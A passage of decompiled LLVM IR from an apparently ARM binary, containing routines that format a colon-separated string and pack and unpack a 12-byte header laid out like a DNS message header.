  store i32 %v6_13dbc, i32* @r4, align 4
  br label %dec_label_pc_13e4c

dec_label_pc_13dc4:                               ; preds = %dec_label_pc_13da8, %dec_label_pc_13da0, %dec_label_pc_13d98
  %v2_13dc4 = icmp eq i32 %v0_13dc466, 0
  br i1 %v2_13dc4, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_13dc4
  %v4_13dcc = inttoptr i32 %v3_13dcc64 to i8*
  store i8 58, i8* %v4_13dcc, align 1
  %v5_13dcc = load i32, i32* @r4, align 4
  %v6_13dcc = add i32 %v5_13dcc, 1
  store i32 %v6_13dcc, i32* @r4, align 4
  %v0_13dd0.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13dc4, %bb52
  %v0_13e10 = phi i32 [ %v3_13dcc64, %dec_label_pc_13dc4 ], [ %v6_13dcc, %bb52 ]
  %v1_13e34 = phi i32 [ 0, %dec_label_pc_13dc4 ], [ %v0_13dd0.pre, %bb52 ]
  %v7_13dd0 = icmp eq i32 %v1_13e34, 6
  br i1 %v7_13dd0, label %dec_label_pc_13dd8, label %dec_label_pc_13e30

dec_label_pc_13dd8:                               ; preds = %.thread3
  %v0_13dd8 = load i32, i32* @r6, align 4
  %v2_13dd8 = icmp eq i32 %v0_13dd8, 0
  br i1 %v2_13dd8, label %dec_label_pc_13de0, label %dec_label_pc_13e30

dec_label_pc_13de0:                               ; preds = %dec_label_pc_13dd8
  %v0_13de0 = load i32, i32* @r7, align 4
  %v7_13de0 = icmp eq i32 %v0_13de0, 6
  br i1 %v7_13de0, label %dec_label_pc_13e00, label %dec_label_pc_13de8

dec_label_pc_13de8:                               ; preds = %dec_label_pc_13de0
  %v7_13de8 = icmp eq i32 %v0_13de0, 5
  br i1 %v7_13de8, label %dec_label_pc_13df0, label %dec_label_pc_13e30

dec_label_pc_13df0:                               ; preds = %dec_label_pc_13de8
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_13df8, label %dec_label_pc_13e00, label %dec_label_pc_13e30

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13df0, %dec_label_pc_13de0
  %v2_13e04 = sub i32 %v25_13c70, %v0_13e10
  %v0_13e08 = load i32, i32* @r8, align 4
  %v1_13e08 = add i32 %v0_13e08, 12
  %v1_13e0c = add i32 %v2_13e04, -32
  store i32 %v1_13e0c, i32* %r2.global-to-local, align 4
  store i32 %v0_13e10, i32* %r1.global-to-local, align 4
  %v3_13e14 = call i32 @function_13b0c(i32 %v1_13e08, i32 %v0_13e10, i32 %v1_13e0c)
  %v2_13e18 = icmp eq i32 %v3_13e14, 0
  br i1 %v2_13e18, label %dec_label_pc_13ea4, label %dec_label_pc_13e20

dec_label_pc_13e20:                               ; preds = %dec_label_pc_13e00
  %v0_13e20 = load i32, i32* @r4, align 4
  store i32 %v0_13e20, i32* @r0, align 4
  %v0_13e24 = call i32 @function_ecc0()
  %v0_13e28 = load i32, i32* @r4, align 4
  %v2_13e28 = add i32 %v0_13e28, %v0_13e24
  store i32 %v2_13e28, i32* @r4, align 4
  %v0_13e60.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13e60

dec_label_pc_13e30:                               ; preds = %dec_label_pc_13df0, %dec_label_pc_13de8, %dec_label_pc_13dd8, %.thread3
  %v4_13e34 = mul i32 %v1_13e34, 4
  %v5_13e34 = add i32 %v4_13e34, %v25_13c70
  store i32 %v0_13e10, i32* @r0, align 4
  %v1_13e3c = add i32 %v5_13e34, -32
  %v2_13e3c = inttoptr i32 %v1_13e3c to i32*
  %v3_13e3c = load i32, i32* %v2_13e3c, align 4
  store i32 %v3_13e3c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_17050.604 to i32), i32* %r1.global-to-local, align 4
  %v4_13e44 = call i32 @function_cdb0(i32 %v0_13e10, i32 ptrtoint ([3 x i8]* @global_var_17050.604 to i32), i32 %v3_13e3c)
  %v0_13e48 = load i32, i32* @r4, align 4
  %v2_13e48 = add i32 %v0_13e48, %v4_13e44
  store i32 %v2_13e48, i32* @r4, align 4
  br label %dec_label_pc_13e4c

dec_label_pc_13e4c:                               ; preds = %dec_label_pc_13db4, %bb51, %dec_label_pc_13e30
  %v3_13dbc24 = phi i32 [ %v3_13dcc64, %dec_label_pc_13db4 ], [ %v6_13dbc, %bb51 ], [ %v2_13e48, %dec_label_pc_13e30 ]
  %v0_13e4c = load i32, i32* @r5, align 4
  %v1_13e4c = add i32 %v0_13e4c, 1
  %v0_13d98.pre = load i32, i32* @r6, align 4
  store i32 %v1_13e4c, i32* @r5, align 4
  %v7_13e54 = icmp slt i32 %v1_13e4c, 8
  %v7_13d98 = icmp eq i32 %v0_13d98.pre, -1
  br i1 %v7_13e54, label %dec_label_pc_13d98, label %dec_label_pc_13e58

dec_label_pc_13e58:                               ; preds = %dec_label_pc_13e4c
  br i1 %v7_13d98, label %.thread4, label %dec_label_pc_13e60

dec_label_pc_13e60:                               ; preds = %dec_label_pc_13e58, %dec_label_pc_13e20
  %v3_13e6c = phi i32 [ %v3_13dbc24, %dec_label_pc_13e58 ], [ %v2_13e28, %dec_label_pc_13e20 ]
  %v0_13e60 = phi i32 [ %v0_13d98.pre, %dec_label_pc_13e58 ], [ %v0_13e60.pre, %dec_label_pc_13e20 ]
  %v1_13e60 = load i32, i32* @r7, align 4
  %v2_13e60 = add i32 %v1_13e60, %v0_13e60
  %v7_13e64 = icmp eq i32 %v2_13e60, 8
  br i1 %v7_13e64, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_13e60
  %v4_13e6c = inttoptr i32 %v3_13e6c to i8*
  store i8 58, i8* %v4_13e6c, align 1
  %v5_13e6c = load i32, i32* @r4, align 4
  %v6_13e6c = add i32 %v5_13e6c, 1
  store i32 %v6_13e6c, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13e60, %dec_label_pc_13e58, %bb53
  %v2_13e74 = phi i32 [ %v3_13e6c, %dec_label_pc_13e60 ], [ %v3_13dbc24, %dec_label_pc_13e58 ], [ %v6_13e6c, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_13e74 = inttoptr i32 %v2_13e74 to i8*
  store i8 0, i8* %v3_13e74, align 1
  %v4_13e74 = load i32, i32* @r4, align 4
  %v5_13e74 = add i32 %v4_13e74, 1
  store i32 %v2_13d8c, i32* %r1.global-to-local, align 4
  %v2_13e7c = sub i32 %v5_13e74, %v2_13d8c
  %v1_13e80 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_13e7c, %v1_13e80
  br i1 %tmp69, label %dec_label_pc_13e88, label %dec_label_pc_13e9c

dec_label_pc_13e88:                               ; preds = %.thread4
  %v0_13e88 = call i32 @function_cc08()
  %v0_13e90 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13e90, i32* %r2.global-to-local, align 4
  %v2_13e94 = inttoptr i32 %v0_13e88 to i32*
  store i32 28, i32* %v2_13e94, align 4
  %v0_13ebc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13ebc

dec_label_pc_13e9c:                               ; preds = %.thread4
  %v0_13e9c = load i32, i32* @sb, align 4
  %v2_13ea0 = bitcast i32* %stack_var_-110 to i8*
  %v3_13ea0 = call i32 @function_ed20(i32 %v0_13e9c, i8* %v2_13ea0)
  br label %dec_label_pc_13ea4

dec_label_pc_13ea4:                               ; preds = %dec_label_pc_13e00, %dec_label_pc_13c98, %dec_label_pc_13e9c
  %v0_13ea4 = phi i32 [ 0, %dec_label_pc_13e00 ], [ %v3_13ca4, %dec_label_pc_13c98 ], [ %v3_13ea0, %dec_label_pc_13e9c ]
  store i32 %v0_13ea4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13ebc

dec_label_pc_13eac:                               ; preds = %dec_label_pc_13c8c
  %v0_13eac = call i32 @function_cc08()
  %v2_13eb4 = inttoptr i32 %v0_13eac to i32*
  store i32 97, i32* %v2_13eb4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13ebc

dec_label_pc_13ebc:                               ; preds = %dec_label_pc_13ea4, %dec_label_pc_13e88, %dec_label_pc_13eac
  %v0_13ebc = phi i32 [ %v0_13ea4, %dec_label_pc_13ea4 ], [ %v0_13ebc.pre, %dec_label_pc_13e88 ], [ 0, %dec_label_pc_13eac ]
  store i32 %v6_13c70, i32* %r5.global-to-local, align 4
  ret i32 %v0_13ebc

; uselistorder directives
  uselistorder i1 %v7_13d98, { 1, 0 }
  uselistorder i32 %v0_13d98.pre, { 1, 0, 2 }
  uselistorder i32 %v1_13e4c, { 1, 0, 2 }
  uselistorder i32 %v0_13e10, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_13dcc64, { 0, 3, 2, 1 }
  uselistorder i32 %v1_13db465, { 2, 0, 1 }
  uselistorder i32 %v0_13dc466, { 3, 2, 0, 1 }
  uselistorder i32 %v2_13d8c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_13d9823, { 1, 0 }
  uselistorder i32 %v0_13d7c, { 1, 2, 0 }
  uselistorder i32 %v1_13d50, { 1, 2, 0 }
  uselistorder i32 %v0_13d64, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13d78, { 1, 2, 0, 3 }
  uselistorder i1 %v7_13d18, { 1, 0 }
  uselistorder i32 %v0_13d50, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_13d34, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_13d44, { 3, 1, 0, 2 }
  uselistorder i32 %v2_13ce8, { 2, 1, 0 }
  uselistorder i32 %v1_13cc8, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_13c70, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 2, 3, 5, 0, 1, 6, 4 }
  uselistorder i32 (i32, i8*)* @function_ed20, { 6, 7, 0, 1, 2, 3, 4, 5, 8, 9 }
  uselistorder i32 (i8*, i32)* @function_ec20, { 7, 0, 6, 8, 9, 10, 15, 13, 14, 11, 1, 4, 12, 5, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @function_13b0c, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_13ebc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13ea4, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13e4c, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_13d98, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13d7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13d74, { 1, 0 }
  uselistorder label %dec_label_pc_13d50, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_13d4c, { 1, 0 }
  uselistorder label %dec_label_pc_13d04, { 1, 0 }
  uselistorder label %dec_label_pc_13cd8, { 1, 0 }
}

define i32 @function_13ed0(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13ed0:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_13ed4 = load i32, i32* @r4, align 4
  store i32 %v3_13ed4, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_13ee4 = icmp sgt i32 %arg3, 11
  br i1 %v7_13ee4, label %dec_label_pc_13ee8, label %dec_label_pc_13fb0

dec_label_pc_13ee8:                               ; preds = %dec_label_pc_13ed0
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_13ee8 = add i32 %tmp, 1
  %v2_13ee8 = inttoptr i32 %v1_13ee8 to i8*
  %v3_13ee8 = load i8, i8* %v2_13ee8, align 1
  store i8 %v3_13ee8, i8* %tmp18, align 1
  %v2_13ef0 = load i32, i32* %arg1, align 4
  %v1_13ef4 = trunc i32 %v2_13ef0 to i8
  %v4_13ef4 = add i32 %arg2, 1
  %v5_13ef4 = inttoptr i32 %v4_13ef4 to i8*
  store i8 %v1_13ef4, i8* %v5_13ef4, align 1
  %v0_13ef8 = load i32, i32* %lr.global-to-local, align 4
  %v1_13ef8 = add i32 %v0_13ef8, 12
  %v2_13ef8 = inttoptr i32 %v1_13ef8 to i32*
  %v3_13ef8 = load i32, i32* %v2_13ef8, align 4
  %v1_13efc = add i32 %v0_13ef8, 4
  %v2_13efc = inttoptr i32 %v1_13efc to i32*
  %v3_13efc = load i32, i32* %v2_13efc, align 4
  %v1_13f00 = add i32 %v0_13ef8, 16
  %v2_13f00 = inttoptr i32 %v1_13f00 to i32*
  %v3_13f00 = load i32, i32* %v2_13f00, align 4
  %v1_13f04 = add i32 %tmp, 8
  %v2_13f04 = inttoptr i32 %v1_13f04 to i32*
  %v3_13f04 = load i32, i32* %v2_13f04, align 4
  %v2_13f08 = icmp eq i32 %v3_13ef8, 0
  %. = select i1 %v2_13f08, i32 0, i32 4
  %v2_13f14 = icmp eq i32 %v3_13efc, 0
  %v1_13f18 = add i32 %v0_13ef8, 20
  %v2_13f18 = inttoptr i32 %v1_13f18 to i32*
  %v3_13f18 = load i32, i32* %v2_13f18, align 4
  %storemerge12 = select i1 %v2_13f14, i32 0, i32 128
  %v1_13f24 = urem i32 %v3_13f04, 16
  %v2_13f28 = icmp eq i32 %v3_13f00, 0
  %.29 = select i1 %v2_13f28, i32 0, i32 2
  %v4_13f34 = mul nuw nsw i32 %v1_13f24, 8
  %v5_13f34 = or i32 %v4_13f34, %.
  %v2_13f38 = icmp eq i32 %v3_13f18, 0
  br i1 %v2_13f38, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_13ee8
  %v2_13f3c = or i32 %v5_13f34, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_13ee8, %bb25
  %v1_13f44 = phi i32 [ %v5_13f34, %dec_label_pc_13ee8 ], [ %v2_13f3c, %bb25 ]
  %v2_13f40 = or i32 %.29, %storemerge12
  %v2_13f44 = or i32 %v2_13f40, %v1_13f44
  %v1_13f48 = trunc i32 %v2_13f44 to i8
  %v2_13f48 = load i32, i32* %r4.global-to-local, align 4
  %v3_13f48 = add i32 %v2_13f48, 2
  %v4_13f48 = inttoptr i32 %v3_13f48 to i8*
  store i8 %v1_13f48, i8* %v4_13f48, align 1
  %v0_13f4c = load i32, i32* %lr.global-to-local, align 4
  %v1_13f4c = add i32 %v0_13f4c, 24
  %v1_13f50 = inttoptr i32 %v1_13f4c to i32*
  %v2_13f50 = load i32, i32* %v1_13f50, align 4
  %v3_13f50 = add i32 %v0_13f4c, 28
  %v4_13f50 = inttoptr i32 %v3_13f50 to i32*
  %v5_13f50 = load i32, i32* %v4_13f50, align 4
  %v2_13f54 = icmp eq i32 %v2_13f50, 0
  %v1_13f58 = urem i32 %v5_13f50, 16
  %.30 = select i1 %v2_13f54, i32 0, i32 128
  %v2_13f64 = or i32 %v1_13f58, %.30
  %v1_13f68 = trunc i32 %v2_13f64 to i8
  %v2_13f68 = load i32, i32* %r4.global-to-local, align 4
  %v3_13f68 = add i32 %v2_13f68, 3
  %v4_13f68 = inttoptr i32 %v3_13f68 to i8*
  store i8 %v1_13f68, i8* %v4_13f68, align 1
  %v0_13f6c = load i32, i32* %lr.global-to-local, align 4
  %v1_13f6c = add i32 %v0_13f6c, 33
  %v2_13f6c = inttoptr i32 %v1_13f6c to i8*
  %v3_13f6c = load i8, i8* %v2_13f6c, align 1
  %v2_13f70 = load i32, i32* %r4.global-to-local, align 4
  %v3_13f70 = add i32 %v2_13f70, 4
  %v4_13f70 = inttoptr i32 %v3_13f70 to i8*
  store i8 %v3_13f6c, i8* %v4_13f70, align 1
  %v0_13f74 = load i32, i32* %lr.global-to-local, align 4
  %v1_13f74 = add i32 %v0_13f74, 32
  %v2_13f74 = inttoptr i32 %v1_13f74 to i32*
  %v3_13f74 = load i32, i32* %v2_13f74, align 4
  %v1_13f78 = trunc i32 %v3_13f74 to i8
  %v2_13f78 = load i32, i32* %r4.global-to-local, align 4
  %v3_13f78 = add i32 %v2_13f78, 5
  %v4_13f78 = inttoptr i32 %v3_13f78 to i8*
  store i8 %v1_13f78, i8* %v4_13f78, align 1
  %v0_13f7c = load i32, i32* %lr.global-to-local, align 4
  %v1_13f7c = add i32 %v0_13f7c, 37
  %v2_13f7c = inttoptr i32 %v1_13f7c to i8*
  %v3_13f7c = load i8, i8* %v2_13f7c, align 1
  %v2_13f80 = load i32, i32* %r4.global-to-local, align 4
  %v3_13f80 = add i32 %v2_13f80, 6
  %v4_13f80 = inttoptr i32 %v3_13f80 to i8*
  store i8 %v3_13f7c, i8* %v4_13f80, align 1
  %v0_13f84 = load i32, i32* %lr.global-to-local, align 4
  %v1_13f84 = add i32 %v0_13f84, 36
  %v2_13f84 = inttoptr i32 %v1_13f84 to i32*
  %v3_13f84 = load i32, i32* %v2_13f84, align 4
  %v1_13f88 = trunc i32 %v3_13f84 to i8
  %v2_13f88 = load i32, i32* %r4.global-to-local, align 4
  %v3_13f88 = add i32 %v2_13f88, 7
  %v4_13f88 = inttoptr i32 %v3_13f88 to i8*
  store i8 %v1_13f88, i8* %v4_13f88, align 1
  %v0_13f8c = load i32, i32* %lr.global-to-local, align 4
  %v1_13f8c = add i32 %v0_13f8c, 41
  %v2_13f8c = inttoptr i32 %v1_13f8c to i8*
  %v3_13f8c = load i8, i8* %v2_13f8c, align 1
  %v2_13f90 = load i32, i32* %r4.global-to-local, align 4
  %v3_13f90 = add i32 %v2_13f90, 8
  %v4_13f90 = inttoptr i32 %v3_13f90 to i8*
  store i8 %v3_13f8c, i8* %v4_13f90, align 1
  %v0_13f94 = load i32, i32* %lr.global-to-local, align 4
  %v1_13f94 = add i32 %v0_13f94, 40
  %v2_13f94 = inttoptr i32 %v1_13f94 to i32*
  %v3_13f94 = load i32, i32* %v2_13f94, align 4
  %v1_13f98 = trunc i32 %v3_13f94 to i8
  %v2_13f98 = load i32, i32* %r4.global-to-local, align 4
  %v3_13f98 = add i32 %v2_13f98, 9
  %v4_13f98 = inttoptr i32 %v3_13f98 to i8*
  store i8 %v1_13f98, i8* %v4_13f98, align 1
  %v0_13f9c = load i32, i32* %lr.global-to-local, align 4
  %v1_13f9c = add i32 %v0_13f9c, 45
  %v2_13f9c = inttoptr i32 %v1_13f9c to i8*
  %v3_13f9c = load i8, i8* %v2_13f9c, align 1
  %v2_13fa0 = load i32, i32* %r4.global-to-local, align 4
  %v3_13fa0 = add i32 %v2_13fa0, 10
  %v4_13fa0 = inttoptr i32 %v3_13fa0 to i8*
  store i8 %v3_13f9c, i8* %v4_13fa0, align 1
  %v0_13fa4 = load i32, i32* %lr.global-to-local, align 4
  %v1_13fa4 = add i32 %v0_13fa4, 44
  %v2_13fa4 = inttoptr i32 %v1_13fa4 to i32*
  %v3_13fa4 = load i32, i32* %v2_13fa4, align 4
  %v1_13fa8 = trunc i32 %v3_13fa4 to i8
  %v2_13fa8 = load i32, i32* %r4.global-to-local, align 4
  %v3_13fa8 = add i32 %v2_13fa8, 11
  %v4_13fa8 = inttoptr i32 %v3_13fa8 to i8*
  store i8 %v1_13fa8, i8* %v4_13fa8, align 1
  %v2_13fb4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13fb0

dec_label_pc_13fb0:                               ; preds = %dec_label_pc_13ed0, %bb26
  %v2_13fb4 = phi i32 [ %v3_13ed4, %dec_label_pc_13ed0 ], [ %v2_13fb4.pre, %bb26 ]
  %v0_13fb0 = phi i32 [ -1, %dec_label_pc_13ed0 ], [ 12, %bb26 ]
  store i32 %v2_13fb4, i32* @r4, align 4
  ret i32 %v0_13fb0

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13fb0, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @function_13fb8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13fb8:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_13fb8 = load i8, i8* %arg1, align 1
  %v4_13fb8 = zext i8 %v3_13fb8 to i32
  %v2_13fbc = add i32 %tmp, 1
  %v3_13fbc = inttoptr i32 %v2_13fbc to i8*
  %v4_13fbc = load i8, i8* %v3_13fbc, align 1
  %v5_13fbc = zext i8 %v4_13fbc to i32
  %v4_13fc0 = mul nuw nsw i32 %v4_13fb8, 256
  %v5_13fc0 = or i32 %v5_13fbc, %v4_13fc0
  %v2_13fc4 = inttoptr i32 %arg2 to i32*
  store i32 %v5_13fc0, i32* %v2_13fc4, align 4
  %v2_13fc8 = add i32 %tmp, 2
  %v3_13fc8 = inttoptr i32 %v2_13fc8 to i8*
  %v4_13fc8 = load i8, i8* %v3_13fc8, align 1
  %tmp4 = icmp slt i8 %v4_13fc8, 0
  %v3_13fcc = zext i1 %tmp4 to i32
  %v2_13fd0 = add i32 %arg2, 4
  %v3_13fd0 = inttoptr i32 %v2_13fd0 to i32*
  store i32 %v3_13fcc, i32* %v3_13fd0, align 4
  %v4_13fd4 = load i8, i8* %v3_13fc8, align 1
  %div = udiv i8 %v4_13fd4, 8
  %tmp5 = urem i8 %div, 16
  %v1_13fdc = zext i8 %tmp5 to i32
  %v2_13fe0 = add i32 %arg2, 8
  %v3_13fe0 = inttoptr i32 %v2_13fe0 to i32*
  store i32 %v1_13fdc, i32* %v3_13fe0, align 4
  %v4_13fe4 = load i8, i8* %v3_13fc8, align 1
  %div1 = udiv i8 %v4_13fe4, 4
  %tmp6 = urem i8 %div1, 2
  %v1_13fec = zext i8 %tmp6 to i32
  %v2_13ff0 = add i32 %arg2, 12
  %v3_13ff0 = inttoptr i32 %v2_13ff0 to i32*
  store i32 %v1_13fec, i32* %v3_13ff0, align 4
  %v4_13ff4 = load i8, i8* %v3_13fc8, align 1
  %div2 = udiv i8 %v4_13ff4, 2
  %tmp7 = urem i8 %div2, 2
  %v1_13ffc = zext i8 %tmp7 to i32
  %v2_14000 = add i32 %arg2, 16
  %v3_14000 = inttoptr i32 %v2_14000 to i32*
  store i32 %v1_13ffc, i32* %v3_14000, align 4
  %v4_14004 = load i8, i8* %v3_13fc8, align 1
  %tmp8 = urem i8 %v4_14004, 2
  %v1_14008 = zext i8 %tmp8 to i32
  %v2_1400c = add i32 %arg2, 20
  %v3_1400c = inttoptr i32 %v2_1400c to i32*
  store i32 %v1_14008, i32* %v3_1400c, align 4
  %v2_14010 = add i32 %tmp, 3
  %v3_14010 = inttoptr i32 %v2_14010 to i8*
  %v4_14010 = load i8, i8* %v3_14010, align 1
  %tmp9 = icmp slt i8 %v4_14010, 0
  %v3_14014 = zext i1 %tmp9 to i32
  %v2_14018 = add i32 %arg2, 24
  %v3_14018 = inttoptr i32 %v2_14018 to i32*
  store i32 %v3_14014, i32* %v3_14018, align 4
  %v4_1401c = load i8, i8* %v3_14010, align 1
  %tmp10 = urem i8 %v4_1401c, 16
  %v1_14020 = zext i8 %tmp10 to i32
  %v2_14024 = add i32 %arg2, 28
  %v3_14024 = inttoptr i32 %v2_14024 to i32*
  store i32 %v1_14020, i32* %v3_14024, align 4
  %v2_14028 = add i32 %tmp, 4
  %v3_14028 = inttoptr i32 %v2_14028 to i8*
  %v4_14028 = load i8, i8* %v3_14028, align 1
  %v5_14028 = zext i8 %v4_14028 to i32
  %v2_1402c = add i32 %tmp, 5
  %v3_1402c = inttoptr i32 %v2_1402c to i8*
  %v4_1402c = load i8, i8* %v3_1402c, align 1
  %v5_1402c = zext i8 %v4_1402c to i32
  %v4_14030 = mul nuw nsw i32 %v5_14028, 256
  %v5_14030 = or i32 %v5_1402c, %v4_14030
  %v2_14034 = add i32 %arg2, 32
  %v3_14034 = inttoptr i32 %v2_14034 to i32*
  store i32 %v5_14030, i32* %v3_14034, align 4
  %v2_14038 = add i32 %tmp, 6
  %v3_14038 = inttoptr i32 %v2_14038 to i8*
  %v4_14038 = load i8, i8* %v3_14038, align 1
  %v5_14038 = zext i8 %v4_14038 to i32
  %v2_1403c = add i32 %tmp, 7
  %v3_1403c = inttoptr i32 %v2_1403c to i8*
  %v4_1403c = load i8, i8* %v3_1403c, align 1
  %v5_1403c = zext i8 %v4_1403c to i32
  %v4_14040 = mul nuw nsw i32 %v5_14038, 256
  %v5_14040 = or i32 %v5_1403c, %v4_14040
  %v2_14044 = add i32 %arg2, 36
  %v3_14044 = inttoptr i32 %v2_14044 to i32*
  store i32 %v5_14040, i32* %v3_14044, align 4
  %v2_14048 = add i32 %tmp, 8
  %v3_14048 = inttoptr i32 %v2_14048 to i8*
  %v4_14048 = load i8, i8* %v3_14048, align 1
  %v5_14048 = zext i8 %v4_14048 to i32
  %v2_1404c = add i32 %tmp, 9
  %v3_1404c = inttoptr i32 %v2_1404c to i8*
  %v4_1404c = load i8, i8* %v3_1404c, align 1
  %v5_1404c = zext i8 %v4_1404c to i32
  %v4_14050 = mul nuw nsw i32 %v5_14048, 256
  %v5_14050 = or i32 %v5_1404c, %v4_14050
  %v2_14054 = add i32 %arg2, 40
  %v3_14054 = inttoptr i32 %v2_14054 to i32*
  store i32 %v5_14050, i32* %v3_14054, align 4
  %v2_14058 = add i32 %tmp, 11
  %v3_14058 = inttoptr i32 %v2_14058 to i8*
  %v4_14058 = load i8, i8* %v3_14058, align 1
  %v5_14058 = zext i8 %v4_14058 to i32
  %v2_1405c = add i32 %tmp, 10
  %v3_1405c = inttoptr i32 %v2_1405c to i8*
  %v4_1405c = load i8, i8* %v3_1405c, align 1
  %v5_1405c = zext i8 %v4_1405c to i32
  %v4_14064 = mul nuw nsw i32 %v5_1405c, 256
  %v5_14064 = or i32 %v4_14064, %v5_14058
  %v2_14068 = add i32 %arg2, 44
  %v3_14068 = inttoptr i32 %v2_14068 to i32*
  store i32 %v5_14064, i32* %v3_14068, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 8, 9, 3, 4, 5, 6, 10, 1, 2, 11, 12, 13, 14, 15, 0, 7 }
  uselistorder i32 40, { 5, 6, 7, 9, 1, 8, 2, 0, 10, 11, 12, 13, 14, 4, 3 }
  uselistorder i32 28, { 9, 4, 5, 6, 10, 11, 30, 12, 14, 7, 13, 1, 15, 2, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0, 27, 8, 28, 3, 29 }
  uselistorder i8 2, { 0, 1, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @function_14070(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_14070:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14070 = load i32, i32* @r4, align 4
  store i32 %v3_14070, i32* %stack_var_-16, align 4
  %v6_14070 = load i32, i32* @r5, align 4
  %v9_14070 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_14078 = load i32, i32* %arg1, align 4
  store i32 %v2_14078, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_14084 = inttoptr i32 %v2_14078 to i8*
  %v2_14084 = call i32 @function_146e4(i8* %v1_14084)
  store i32 %v2_14084, i32* %r0.global-to-local, align 4
  %v1_14088 = icmp slt i32 %v2_14084, 0
  br i1 %v1_14088, label %bb, label %bb6

bb:                                               ; preds = %dec_label_pc_14070
  %v5_14090 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_14090, i32* @r4, align 4
  store i32 %v6_14070, i32* @r5, align 4
  store i32 %v9_14070, i32* @r6, align 4
  ret i32 %v2_14084

bb6:                                              ; preds = %dec_label_pc_14070
  %v1_1408c = load i32, i32* @r4, align 4
  %v2_1408c = sub i32 %v1_1408c, %v2_14084
  %v0_14098 = load i32, i32* @r6, align 4
  %v2_14098 = add i32 %v0_14098, %v2_14084
  store i32 %v2_14098, i32* %r2.global-to-local, align 4
  %v7_1409c = icmp sgt i32 %v2_1408c, 3
  br i1 %v7_1409c, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_140a0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_140a0, i32* @r4, align 4
  store i32 %v6_14070, i32* @r5, align 4
  store i32 %v9_14070, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_140a4 = load i32, i32* @r5, align 4
  %v1_140a4 = add i32 %v0_140a4, 5
  %v2_140a4 = inttoptr i32 %v1_140a4 to i8*
  %v3_140a4 = load i8, i8* %v2_140a4, align 1
  %v5_140a8 = inttoptr i32 %v2_14098 to i8*
  store i8 %v3_140a4, i8* %v5_140a8, align 1
